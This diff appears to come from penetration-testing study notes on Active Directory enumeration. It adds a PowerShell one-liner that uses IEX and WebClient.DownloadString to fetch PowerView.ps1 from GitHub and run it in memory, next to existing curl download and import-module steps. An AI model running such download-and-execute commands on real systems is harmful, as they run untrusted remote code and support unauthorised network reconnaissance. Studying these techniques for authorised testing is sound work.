@@ -96,6 +96,9 @@ curl https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1  -Outfile PowerVie
 import-module .\Microsoft.ActiveDirectory.Management.dll
 import-module .\PowerView.ps1
 ```
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerView.ps1")
+```
 
 ##### LIST - FOREST
 ```
